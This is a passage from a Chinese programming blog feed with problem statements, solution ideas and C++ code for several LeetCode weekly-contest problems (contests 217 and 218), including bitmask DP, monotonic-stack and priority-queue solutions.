<span class="title">concatenatedBinary</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">long</span> <span class="keyword">long</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">long</span> <span class="keyword">long</span> mod = <span class="number">1e9</span> + <span class="number">7</span>;</span><br><span class="line">        <span class="keyword">long</span> <span class="keyword">long</span> curr = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">memset</span>(dp,<span class="number">0</span>,<span class="keyword">sizeof</span>(dp));</span><br><span class="line">        </span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        dp[<span class="number">1</span>] = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">2</span>; i &lt;= n*<span class="number">20</span>; ++i)&#123;</span><br><span class="line">            dp[i] = (dp[i<span class="number">-1</span>]*<span class="number">2</span>)%mod;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">int</span> l = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = n; i &gt;= <span class="number">1</span>; --i)&#123;</span><br><span class="line">            <span class="keyword">int</span> curr = i;</span><br><span class="line">            <span class="keyword">while</span>(curr)&#123;</span><br><span class="line">                l++;</span><br><span class="line">                <span class="keyword">if</span>(curr%<span class="number">2</span>)&#123;</span><br><span class="line">                    ans = (ans + dp[l])%mod;</span><br><span class="line">                &#125;</span><br><span class="line">                curr = curr&gt;&gt;<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol></blockquote><h2 id="5619-最小不兼容性"><a href="#5619-最小不兼容性" class="headerlink" title="5619. 最小不兼容性"></a>5619. 最小不兼容性</h2><h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><p>给你一个整数数组 <code>nums​​​</code>和一个整数 <code>k</code> 。你需要将这个数组划分到<code>k</code>个相同大小的子集中，使得同一个子集里面没有两个相同的元素。</p><p>一个子集的 不兼容性 是该子集里面最大值和最小值的差。</p><p>请你返回将数组分成 <code>k</code>个子集后，各子集 不兼容性 的 和 的 最小值 ，如果无法分成分成 k 个子集，返回 -1 。</p><p>子集的定义是数组中一些数字的集合，对数字顺序没有要求。</p><p>示例 1：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">4</span>], k = <span class="number">2</span></span><br><span class="line">输出：<span class="number">4</span></span><br><span class="line">解释：最优的分配是 [<span class="number">1</span>,<span class="number">2</span>] 和 [<span class="number">1</span>,<span class="number">4</span>] 。</span><br><span class="line">不兼容性和为 (<span class="number">2</span><span class="number">-1</span>) + (<span class="number">4</span><span class="number">-1</span>) = <span class="number">4</span> 。</span><br><span class="line">注意到 [<span class="number">1</span>,<span class="number">1</span>] 和 [<span class="number">2</span>,<span class="number">4</span>] 可以得到更小的和，但是第一个集合有 <span class="number">2</span> 个相同的元素，所以不可行。</span><br></pre></td></tr></table></figure><br>示例 2：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [<span class="number">6</span>,<span class="number">3</span>,<span class="number">8</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>], k = <span class="number">4</span></span><br><span class="line">输出：<span class="number">6</span></span><br><span class="line">解释：最优的子集分配为 [<span class="number">1</span>,<span class="number">2</span>]，[<span class="number">2</span>,<span class="number">3</span>]，[<span class="number">6</span>,<span class="number">8</span>] 和 [<span class="number">1</span>,<span class="number">3</span>] 。</span><br><span class="line">不兼容性和为 (<span class="number">2</span><span class="number">-1</span>) + (<span class="number">3</span><span class="number">-2</span>) + (<span class="number">8</span><span class="number">-6</span>) + (<span class="number">3</span><span class="number">-1</span>) = <span class="number">6</span> 。</span><br></pre></td></tr></table></figure><br>示例 3：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [<span class="number">5</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">3</span>], k = <span class="number">3</span></span><br><span class="line">输出：<span class="number">-1</span></span><br><span class="line">解释：没办法将这些数字分配到 <span class="number">3</span> 个子集且满足每个子集里没有相同数字。</span><br></pre></td></tr></table></figure></p><p>提示：</p><ul><li><code>1 &lt;= k &lt;= nums.length &lt;= 16</code></li><li><code>nums.length</code> 能被 <code>k</code> 整除。</li><li><code>1 &lt;= nums[i] &lt;= nums.length</code></li></ul><h3 id="地址-3"><a href="#地址-3" class="headerlink" title="地址"></a>地址</h3><p><a href="https://leetcode-cn.com/problems/minimum-incompatibility" target="_blank" rel="noopener">https://leetcode-cn.com/problems/minimum-incompatibility</a></p><h3 id="题意-3"><a href="#题意-3" class="headerlink" title="题意"></a>题意</h3><blockquote><p> 状态压缩<code>dp</code>和子集枚举 </p><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><ol><li>这种类似得状态压缩<code>dp</code>题目已经遇到好多次了，但是本题需要仔细优化以下，否则非常容易超时。</li><li>设置<code>dp[mask]</code>表示状态<code>mask</code>代表得二进制位图的最小兼容性，<code>valid[mask]</code>代表状态<code>mask</code>代表得二进制位图的子数组是否合法，即划分为子集后不能出现重复的元素。</li><li>我们可以预先处理，我们可以求出`每个子集的元素个数为$width = \frac{n}{k}$。</li><li>我们每次对状态<code>mask</code>进行子集枚举，刚好枚举的子集<code>T</code>的元素个数为为$\frac{n}{k}$,集合<code>mask</code>中去掉子集<code>T</code>以外的元素集合为$mask \bigoplus T$，则此时我们可以知道:<script type="math/tex; mode=display">dp[mask] = min(dp[mask],dp[T] + dp[mask \bigoplus T])</script></li><li>进一步优化，我们可以预先处理，求出子集的不兼容性的得分为$score[T]$,同时我们可以提前求出任意的子集和剩余的子集是否合法，从而可以避免重复计算，且我们只计算元素个数能够被<code>width</code>整除的集合。<h3 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> INF = <span class="number">0x3f3f3f3f</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">int</span> dp[<span class="number">1</span>&lt;&lt;<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">bool</span> valid[<span class="number">1</span>&lt;&lt;<span class="number">16</span>];</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">checkValid</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &amp; nums,<span class="keyword">int</span> k)</span></span>&#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; cnt(<span class="number">17</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> v : nums)&#123;</span><br><span class="line">            cnt[v]++;</span><br><span class="line">            <span class="keyword">if</span>(cnt[v] &gt; k) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">minimumIncompatibility</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.size();</span><br><span class="line">        <span class="keyword">int</span> w = n/k;</span><br><span class="line">        <span class="keyword">int</span> mask = (<span class="number">1</span>&lt;&lt;n)<span class="number">-1</span>;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; arr;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">memset</span>(dp,INF,<span class="keyword">sizeof</span>(dp));</span><br><span class="line">        <span class="built_in">memset</span>(valid,<span class="literal">false</span>,<span class="keyword">sizeof</span>(valid));</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; (<span class="number">1</span>&lt;&lt;n); ++i)&#123;</span><br><span class="line">            arr.clear();</span><br><span class="line">            <span class="keyword">int</span> bitCnt = __builtin_popcount(i);</span><br><span class="line">            <span class="keyword">if</span>(bitCnt%w == <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; n; ++j)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(i&amp;(<span class="number">1</span>&lt;&lt;j)) arr.push_back(nums[j]);</span><br><span class="line">                &#125;</span><br><span class="line">                sort(arr.begin(),arr.end());</span><br><span class="line">                <span class="keyword">if</span>(bitCnt == w) dp[i] = arr.back()-arr[<span class="number">0</span>];</span><br><span class="line">                valid[i] = checkValid(arr,bitCnt/w);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!valid[mask]) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">        valid[<span class="number">0</span>] = <span class="literal">true</span>;</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; (<span class="number">1</span>&lt;&lt;n); ++i)&#123;</span><br><span class="line">            <span class="keyword">if</span>(__builtin_popcount(i)%w != <span class="number">0</span>) <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = i; j != <span class="number">0</span>; j = (j<span class="number">-1</span>)&amp;i)&#123;</span><br><span class="line">                <span class="keyword">if</span>(__builtin_popcount(j) != w) <span class="keyword">continue</span>;</span><br><span class="line">                <span class="keyword">if</span>(valid[j] &amp;&amp; valid[i^j])&#123;</span><br><span class="line">                    dp[i] = min(dp[i],dp[j] + dp[i^j]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">       </span><br><span class="line">        <span class="keyword">return</span> dp[mask];      </span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol></blockquote><h2 id><a href="#" class="headerlink" title="#"></a>#</h2><p>欢迎关注和打赏，感谢支持！</p><ul><li>关注我的博客: <a href="http://mikemeng.org/" target="_blank" rel="noopener">http://mikemeng.org/</a></li><li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu" target="_blank" rel="noopener">https://www.zhihu.com/people/da-hua-niu</a></li><li>关注我的微信公众号: 公务程序猿<br><img src="https://i.loli.net/2020/11/16/xtyDOgT6Gm1AKdS.png" alt="1"></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;leetcode-contest-218&quot;&gt;&lt;a href=&quot;#leetcode-contest-218&quot; class=&quot;headerlink&quot; title=&quot;leetcode   contest 218&quot;&gt;&lt;/a&gt;leetcode   contest 218&lt;/h1&gt;&lt;p&gt;本周周赛最后一题果真是惯例题目，只做出来前三道题目，最后一题的状态压缩&lt;code&gt;dp&lt;/code&gt;还是比较有难度的题目，需要进行优化。&lt;/p&gt;&lt;h2 id=&quot;5617-设计-Goal-解析器&quot;&gt;&lt;a href=&quot;#5617-设计-Goal-解析器&quot; class=&quot;headerlink&quot; title=&quot;5617. 设计 Goal 解析器&quot;&gt;&lt;/a&gt;5617. 设计 Goal 解析器&lt;/h2&gt;&lt;h3 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h3&gt;&lt;p&gt;请你设计一个可以解释字符串 &lt;code&gt;command&lt;/code&gt;的 &lt;code&gt;Goal&lt;/code&gt; 解析器 。&lt;code&gt;command&lt;/code&gt;由 &lt;code&gt;&amp;quot;G&amp;quot;、&amp;quot;()&amp;quot;&lt;/code&gt;和/或 &lt;code&gt;&amp;quot;(al)&amp;quot;&lt;/code&gt;按某种顺序组成。&lt;code&gt;Goal&lt;/code&gt; 解析器会将 &lt;code&gt;&amp;quot;G&amp;quot;&lt;/code&gt; 解释为字符串&lt;code&gt;&amp;quot;G&amp;quot;、&amp;quot;()&amp;quot;&lt;/code&gt;解释为字符串&lt;code&gt;&amp;quot;o&amp;quot; ，&amp;quot;(al)&amp;quot;&lt;/code&gt;解释为字符串 “al” 。然后，按原顺序将经解释得到的字符串连接成一个字符串。&lt;/p&gt;
    
    </summary>
    
    
      <category term="算法" scheme="http://yoursite.com/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="leetcode" scheme="http://yoursite.com/tags/leetcode/"/>
    
  </entry>
  
  <entry>
    <title>【Leetcode】  周赛 217场</title>
    <link href="http://yoursite.com/2020/11/29/231/"/>
    <id>http://yoursite.com/2020/11/29/231/</id>
    <published>2020-11-29T14:22:31.637Z</published>
    <updated>2020-12-01T04:28:19.373Z</updated>
    
    <content type="html"><![CDATA[<h1 id="leetcode-contest-217"><a href="#leetcode-contest-217" class="headerlink" title="leetcode   contest 217"></a>leetcode   contest 217</h1><p>本周周赛难度果真很大，只做出了前2题，后面2题确实很难，基本上没有什么思路。确实是非常经典的<code>cp</code>题目，偶尔会出现难度很大的题目。</p><h2 id="5613-最富有客户的资产总量"><a href="#5613-最富有客户的资产总量" class="headerlink" title="5613. 最富有客户的资产总量"></a>5613. 最富有客户的资产总量</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>给你一个 <code>m x n</code>的整数网格 <code>accounts</code>，其中 <code>accounts[i][j]</code>是第 <code>i​​​​​​​​​​​​</code> 位客户在第 <code>j</code> 家银行托管的资产数量。返回最富有客户所拥有的 资产总量 。</p><a id="more"></a><p>客户的 资产总量 就是他们在各家银行托管的资产数量之和。最富有客户就是 资产总量 最大的客户。</p><p>示例 1：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">输入：accounts = [[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>],[<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>]]</span><br><span class="line">输出：<span class="number">6</span></span><br><span class="line">解释：</span><br><span class="line">第 <span class="number">1</span> 位客户的资产总量 = <span class="number">1</span> + <span class="number">2</span> + <span class="number">3</span> = <span class="number">6</span></span><br><span class="line">第 <span class="number">2</span> 位客户的资产总量 = <span class="number">3</span> + <span class="number">2</span> + <span class="number">1</span> = <span class="number">6</span></span><br><span class="line">两位客户都是最富有的，资产总量都是 <span class="number">6</span> ，所以返回 <span class="number">6</span> 。</span><br></pre></td></tr></table></figure><br>示例 2：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">输入：accounts = [[<span class="number">1</span>,<span class="number">5</span>],[<span class="number">7</span>,<span class="number">3</span>],[<span class="number">3</span>,<span class="number">5</span>]]</span><br><span class="line">输出：<span class="number">10</span></span><br><span class="line">解释：</span><br><span class="line">第 <span class="number">1</span> 位客户的资产总量 = <span class="number">6</span></span><br><span class="line">第 <span class="number">2</span> 位客户的资产总量 = <span class="number">10</span> </span><br><span class="line">第 <span class="number">3</span> 位客户的资产总量 = <span class="number">8</span></span><br><span class="line">第 <span class="number">2</span> 位客户是最富有的，资产总量是 <span class="number">10</span></span><br><span class="line">示例 <span class="number">3</span>：</span><br><span class="line"></span><br><span class="line">输入：accounts = [[<span class="number">2</span>,<span class="number">8</span>,<span class="number">7</span>],[<span class="number">7</span>,<span class="number">1</span>,<span class="number">3</span>],[<span class="number">1</span>,<span class="number">9</span>,<span class="number">5</span>]]</span><br><span class="line">输出：<span class="number">17</span></span><br></pre></td></tr></table></figure></p><p>提示：</p><ul><li><code>m == accounts.length</code></li><li><code>n == accounts[i].length</code></li><li><code>1 &lt;= m, n &lt;= 50</code></li><li><code>1 &lt;= accounts[i][j] &lt;= 100</code></li></ul><h3 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h3><p><a href="https://leetcode-cn.com/problems/richest-customer-wealth" target="_blank" rel="noopener">https://leetcode-cn.com/problems/richest-customer-wealth</a></p><h3 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h3><blockquote><p>  暴力</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ol><li>求矩阵每行的和即可。<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">maximumWealth</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt;&amp; accounts)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> row = accounts.size();</span><br><span class="line">        <span class="keyword">int</span> col = accounts[<span class="number">0</span>].size();</span><br><span class="line">        <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; row; ++i)&#123;</span><br><span class="line">            <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; col; ++j)&#123;</span><br><span class="line">                sum += accounts[i][j];</span><br><span class="line">            &#125;</span><br><span class="line">            ans = max(ans,sum);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol></blockquote><h2 id="5614-找出最具竞争力的子序列"><a href="#5614-找出最具竞争力的子序列" class="headerlink" title="5614. 找出最具竞争力的子序列"></a>5614. 找出最具竞争力的子序列</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><p>给你一个整数数组 <code>nums</code>和一个正整数 k ，返回长度为 k 且最具 竞争力 的 <code>nums</code>子序列。</p><p>数组的子序列是从数组中删除一些元素（可能不删除元素）得到的序列。</p><p>在子序列 <code>a</code>和子序列 <code>b</code>第一个不相同的位置上，如果 <code>a</code>中的数字小于 b 中对应的数字，那么我们称子序列 <code>a</code> 比子序列 <code>b</code>（相同长度下）更具 竞争力 。 例如，<code>[1,3,4]</code>比 <code>[1,3,5]</code>更具竞争力，在第一个不相同的位置，也就是最后一个位置上， <code>4</code>小于<code>5</code> 。</p><p>示例 1：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [<span class="number">3</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">6</span>], k = <span class="number">2</span></span><br><span class="line">输出：[<span class="number">2</span>,<span class="number">6</span>]</span><br><span class="line">解释：在所有可能的子序列集合 &#123;[<span class="number">3</span>,<span class="number">5</span>], [<span class="number">3</span>,<span class="number">2</span>], [<span class="number">3</span>,<span class="number">6</span>], [<span class="number">5</span>,<span class="number">2</span>], [<span class="number">5</span>,<span class="number">6</span>], [<span class="number">2</span>,<span class="number">6</span>]&#125; 中，[<span class="number">2</span>,<span class="number">6</span>] 最具竞争力。</span><br></pre></td></tr></table></figure><br>示例 2：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [<span class="number">2</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">6</span>], k = <span class="number">4</span></span><br><span class="line">输出：[<span class="number">2</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">4</span>]</span><br></pre></td></tr></table></figure></p><p>提示：</p><ul><li><code>1 &lt;= nums.length &lt;= 105</code></li><li><code>0 &lt;= nums[i] &lt;= 109</code></li><li><code>1 &lt;= k &lt;= nums.length</code></li></ul><h3 id="地址-1"><a href="#地址-1" class="headerlink" title="地址"></a>地址</h3><p><a href="https://leetcode-cn.com/problems/find-the-most-competitive-subsequence" target="_blank" rel="noopener">https://leetcode-cn.com/problems/find-the-most-competitive-subsequence</a></p><h3 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h3><blockquote><p> 贪心算法</p><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><ol><li>本质为贪心算法，将尽可能小的数往目标数列中添加，并且尽可能的将最小的元素添加在目标数列的前面，并满足最终的数列的长度为<code>k</code>。<br>假设当前的目标数为<code>nums[i]</code>,当前已经选中的数列为<code>target</code>, 则我们需要将<code>num[i]</code>与<code>target[j]</code>进行替换，并且删除索引为<code>[j+1,k-1]</code>的元素。我们假设已经知道<code>nums[i]</code> &gt; <code>target[j]</code>，则此时我们可以知道如下：<script type="math/tex; mode=display">arr1 = (target[0],target[1],...target[j],target[j+1],...,target[k-1]) \\arr2 = (target[0],target[1],...,nums[i],....)</script>我们知道如果满足$nums[i] &gt; target[j]$时，<code>arr2</code>的竞争力一定比<code>arr1</code>的竞争力强，所以我们应找到最小的<code>j</code>,满足：<script type="math/tex; mode=display">nums[i] > target[t]]_{t=j}^{k-1}</script>如果我们能够将<code>nums[i]</code>替换<code>target[j]</code>且<code>[i+1,n-1]</code>的元素的个数加上<code>j+1</code>应该满足大于等于<code>k</code>,否则就无法满足<code>k</code>个元素的长度要求，因此我们在实际判断时需要判断<code>n-i + ans.size() &gt; k</code>。</li><li>优先级队列，我们每次直接筛选最小值，然后维护窗口右移即可。时间复杂度为$O(n\lg{n})$,算法也非常经典。筛选出最小的<code>k</code>个数即可。<h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3></li></ol><ul><li>单调栈<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:    </span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; mostCompetitive(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> k) &#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.size();</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; ans;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i)&#123;</span><br><span class="line">            <span class="keyword">while</span>(!ans.empty() &amp;&amp; ans.back() &gt; nums[i] &amp;&amp; n-i + ans.size() &gt; k) ans.pop_back();</span><br><span class="line">            <span class="keyword">if</span>(ans.size() &lt; k) ans.push_back(nums[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li>优先级队列<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; mostCompetitive(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> k) &#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.size();</span><br><span class="line">        priority_queue&lt;pair&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt;, <span class="built_in">vector</span>&lt;pair&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt;&gt;, greater&lt;&gt;&gt; pq;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n - k + <span class="number">1</span>; ++i)</span><br><span class="line">            pq.emplace(nums[i], i);</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; ans;</span><br><span class="line">        <span class="keyword">int</span> l = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; k; ++i) &#123;</span><br><span class="line">            <span class="keyword">while</span> (pq.top().second &lt; l)</span><br><span class="line">                pq.pop();</span><br><span class="line">            <span class="keyword">auto</span> [num, idx] = pq.top();</span><br><span class="line">            pq.pop();</span><br><span class="line">            l = idx + <span class="number">1</span>;</span><br><span class="line">            ans.emplace_back(num);</span><br><span class="line">            <span class="keyword">if</span> (i &lt; k - <span class="number">1</span>)</span><br><span class="line">                pq.emplace(nums[n - k + i + <span class="number">1</span>], n - k + i + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ul></blockquote><h2 id="5615-使数组互补的最少操作次数"><a href="#5615-使数组互补的最少操作次数" class="headerlink" title="5615. 使数组互补的最少操作次数"></a>5615. 使数组互补的最少操作次数</h2><p>给你一个长度为 偶数 n 的整数数组 <code>nums</code> 和一个整数 <code>limit</code>。每一次操作，你可以将 <code>nums</code> 中的任何整数替换为 1 到 limit 之间的另一个整数。</p><p>如果对于所有下标 i（下标从 0 开始），<code>nums[i] + nums[n - 1 - i]</code> 都等于同一个数，则数组 <code>nums</code> 是 互补的 。例如，数组 <code>[1,2,3,4]</code> 是互补的，因为对于所有下标<code>i ，nums[i] + nums[n - 1 - i] = 5</code>。</p><p>返回使数组 互补 的 最少 操作次数。</p><p>示例 1：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">3</span>], limit = <span class="number">4</span></span><br><span class="line">输出：<span class="number">1</span></span><br><span 